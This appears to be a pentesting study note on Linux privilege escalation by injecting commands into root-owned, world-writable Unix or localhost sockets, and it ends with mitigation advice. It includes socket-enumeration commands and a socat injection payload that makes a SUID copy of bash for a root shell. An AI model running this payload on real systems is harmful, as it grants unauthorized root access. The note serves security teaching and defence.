---
tags: [linux, privesc, sockets, ipc, pentesting, red-team]
difficulty: intermediate
module: "44 - Linux Privilege Escalation"
topic: "44.38 Socket Command Injection"
---

# Socket Command Injection

## Introduction
Many Linux services expose a **Unix domain socket** (or a localhost TCP socket) as a control/IPC channel: a privileged daemon listens on the socket, and clients send it commands. If a **root-owned service** listens on a socket that a low-privileged user can write to, and it executes or acts on the received data without authentication or sanitization, an unprivileged user can inject commands that run **as root**. This is the Linux analogue of the Windows named-pipe / auto-updater IPC abuse, and it overlaps with systemd socket activation and D-Bus ([[27 - D-Bus Interface Misconfigurations]]).

## How the Vulnerability Arises
```text
+---------------------------------------------------------------+
|                 SOCKET COMMAND INJECTION                     |
+---------------------------------------------------------------+
|  root daemon  listens on  /run/foo.sock  (or 127.0.0.1:port)  |
|        |  socket perms allow 'others' to write (srw-rw-rw-)    |
|        v                                                       |
|  low-priv user connects + sends a "command" message           |
|        |  daemon parses it and runs system()/exec/eval        |
|        |  with NO auth + NO input validation                  |
|        v                                                       |
|  command executes as ROOT                                     |
+---------------------------------------------------------------+
```
The two ingredients are **(1) a writable socket** and **(2) the daemon treating socket input as a command**. Either weak socket permissions or a too-trusting protocol is enough.

## Finding Writable / Privileged Sockets
```bash
# List Unix sockets with their inode/perms
ss -xlp 2>/dev/null            # listening unix sockets + owning process
ls -la /run /var/run /tmp 2>/dev/null | grep '^s'   # socket files (type 's')
find / -type s 2>/dev/null     # all socket files
# check who can write the socket
ls -l /run/foo.sock            # look for srw-rw-rw- / group you're in
# localhost TCP control ports
ss -ltnp | grep 127.0.0.1
# systemd socket units (socket-activated services)
systemctl list-sockets
```
A socket showing `srw-rw-rw-` (world-writable) owned by a root process is the prime target.

## Exploitation
1. **Identify the protocol** the daemon expects — read its config/docs, strings in the binary, or observe a legitimate client with `strace`/`ltrace`.
2. **Connect and send a command.** Generic probing:
   ```bash
   # Unix socket
   echo 'COMMAND payload' | socat - UNIX-CONNECT:/run/foo.sock
   nc -U /run/foo.sock
   # localhost TCP
   socat - TCP:127.0.0.1:PORT
   ```
3. **Inject a command** if the daemon passes input to a shell. Many home-grown management sockets accept something like `exec <cmd>` or interpolate input into `system()`:
   ```bash
   echo 'exec cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' | socat - UNIX-CONNECT:/run/foo.sock
   /tmp/rootbash -p     # root shell via SUID copy (see [[03 ...]])
   ```
4. **Confirm execution as root** (check ownership of created files / `id` via a callback).

## Related Mechanisms
- **systemd socket activation:** a writable `.socket` unit or its associated service can be abused; tampering with socket-activated service units is a privesc (see [[26 - Systemd Service File Abuse]]).
- **D-Bus** is a structured IPC bus with the same trust pitfalls — methods callable by low-priv users that perform privileged actions ([[27 - D-Bus Interface Misconfigurations]]).
- **Docker socket** (`/var/run/docker.sock`) is the most famous instance — control of it is host root ([[19 - Docker Group Membership]]).

## Why It Matters in an Engagement
Custom management/agent sockets are common on appliances, monitoring agents, and bespoke services, and they are frequently written without authentication ("only local processes can reach it, so it's safe"). A world-writable root socket that interprets input is a direct, quiet root. Enumerating sockets is a high-yield, often-overlooked step.

## Detection and Mitigation
- Set **restrictive socket permissions/ownership** (e.g. `0600`/`0660` to a dedicated group); never world-writable.
- **Authenticate the peer** using `SO_PEERCRED` (verify the connecting uid/gid) before acting; validate all input; never pass socket data to a shell.
- Prefer structured, authenticated IPC (Polkit-mediated D-Bus) over ad-hoc command sockets.
- Monitor connections to privileged sockets by unexpected uids and root daemons spawning shells.

## Chaining Opportunities
- The SUID-copy payload reuses [[03 - SUID Binaries Abuse]].
- Conceptual sibling of [[27 - D-Bus Interface Misconfigurations]] and the Docker-socket escape ([[19 - Docker Group Membership]]).
- systemd-activated sockets tie to [[26 - Systemd Service File Abuse]].

## Related Notes
- [[27 - D-Bus Interface Misconfigurations]]
- [[26 - Systemd Service File Abuse]]
- [[19 - Docker Group Membership]]
- [[03 - SUID Binaries Abuse]]
